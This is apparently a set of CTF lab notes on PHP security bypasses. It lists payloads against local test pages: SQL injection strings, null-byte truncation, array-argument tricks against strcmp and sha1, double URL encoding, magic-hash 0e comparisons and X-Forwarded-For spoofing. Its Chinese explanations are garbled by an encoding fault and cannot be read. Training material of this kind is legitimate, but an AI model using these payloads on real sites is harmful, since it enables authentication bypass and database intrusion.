## 01 extract��������

http://127.0.0.1/Php_Bug/extract1.php?shiyan=&flag=1


## 03 ���ؼ���

<?php

$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// echo $token;

?>

eJxLtDK0qs60MrBOAuJaAB5uBBQ=


## 04 SQLע��_WITH ROLLUP�ƹ�


admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- - 

���ϣ�
[ʵ��� ��ȱ˼͡���ƹ� By Assassin��with rollupͳ�ƣ�](http://blog.csdn.net/qq_35078631/article/details/54772798)
[ʹ�� GROUP BY WITH ROLLUP ����ͳ������](http://blog.csdn.net/id19870510/article/details/6254358)
[��ȱ˼͡���ƹ�](http://www.bubuko.com/infodetail-2169730.html)

## 05 ereg����%00�ض�

http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*

���ϣ�
[eregi()](http://www.am0s.com/functions/203.html)

## 06 strcmp�Ƚ��ַ���

http://127.0.0.1/Php_Bug/06.php?a[]=1

������������ڱȽ��ַ����ĺ���

int strcmp ( string $str1 , string $str2 )
���� str1��һ���ַ�����str2�ڶ����ַ�������� str1 С�� str2 ���� < 0�� ��� str1 ���� str2 ���� > 0�����������ȣ����� 0��

��֪������������������ַ������͵����ݣ�����������Ǵ�����ַ������͵����ݵ�ʱ�����������������ô������Ϊ�أ�ʵ���ϣ�������������ܵ��˲����ϵ����ͣ�����������������󣬵�����5.3֮ǰ��php�У���ʾ�˱���ľ�����Ϣ�󣬽�return 0 !!!! Ҳ������Ȼ���˴���ȴ�ж�������ˡ������ʹ�������������ѡ������е��жϵĴ�����˵��ֱ��һ��������©������Ȼ��php�ٷ��ں���İ汾���޸������©����ʹ�ñ����ʱ�����������κ�ֵ��

## 07sha()�����Ƚ��ƹ�

http://127.0.0.1/Php_Bug/07.php?name[]=1&password[]=2

===��Ƚ����ͣ�����bool
sha1()������md5()����������©����sha1()����Ĭ�ϵĴ�������������ַ����ͣ���Ҫ�Ǹ������������ػ���ִ���ʹsha1()�������ش���Ҳ���Ƿ���false������һ��===������Ϳ��Է��������ˣ���Ҫ����username��password�Ȳ���ȣ���ͬ������������
?name[]=a&amp;password[]=b

## 08 SESSION��֤�ƹ�

http://127.0.0.1/Php_Bug/08.php?password=

ɾ��cookies����ɾ��cookies��ֵ

���ϣ�
[��Writeup��Boston Key Party CTF 2015(������Ŀ)](http://blog.csdn.net/lymingha0/article/details/44079981)

## 09 ����md5�Ƚ��ƹ�

?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456

���ϣ�
[DUTCTF-2015-Writeup](http://bobao.360.cn/ctf/learning/129.html)

## 10 urldecode���α����ƹ�

h��URL����Ϊ��%68�����α���Ϊ%2568���ƹ�

http://127.0.0.1/Php_Bug/10.php?id=%2568ackerDJ

���ϣ�
[URL�����](https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin)


## 11 sql�պ��ƹ�

����exp�պ��ƹ�
admin')#


## 12 X-Forwarded-For�ƹ�ָ��IP��ַ

HTTPͷ���
X-Forwarded-For:1.1.1.1

## 13 md5��������ƹ�

http://127.0.0.1/Php_Bug/13.php?a=240610708

��==���Աȵ�ʱ����������ת����0eXXXXXXXXXX ת��0�ˣ�����Ƚ�һ�����ֺ��ַ������߱Ƚ��漰���������ݵ��ַ��������ַ����ᱻת��Ϊ��ֵ���ұȽϰ�����ֵ������ 

var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2' == '1e3');
var_dump('0x1234Ab' == '1193131');
var_dump('0xABCdef' == ' 0xABCdef');

md5('240610708'); // 0e462097431906509019562988736854 
md5('QNKCDZO'); // 0e830400451993494058024219903391 

������������ 0x1234Ab��Ȼ���˳���¼�ٵ�¼�������� 1193131 ��¼�������¼�ɹ�����ô������������ı����û�ܡ� 


ͬ����������Ϊ 240610708�������� QNKCDZO ��¼�ܳɹ�����ô����û����ֱ��md5����ġ�

���ϣ�
[PHP ̽��������վ��������/�����ֶΰ취](https://www.v2ex.com/t/188364)

## 14 intval������������

1024.1�ƹ�

���ϣ�
[ PHP intval()��������](http://blog.csdn.net/wangjian1012/article/details/51581564)

## 15 strpos�����ƹ�NULL��ereg����%00�ض�

����һ��

��Ҫ�Ǵ�����,��Ҫ�С�#biubiubiu��.strpos()�ҵ����ַ���,��ô��һ���������,strpos()������null,null!==false,���Է���Ҫ��. 
��������nctf[]=
��Ϊʲôereg()Ҳ�ܷ�����?��Ϊereg()�ڳ���ʱ���ص�Ҳ��null,null!==false,���Է���Ҫ��. 

��������
�ַ����ض�,����ereg()��NULL�ض�©�����ƹ��������

http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu ����
�轫#����
http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu
��ȷ

## 16 SQLע��or�ƹ�

$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';

?username=admin\'\' AND pass=\''or 1 #&password=

## 17 ����md5�Ƚ��ƹ�

//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #

?user='and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
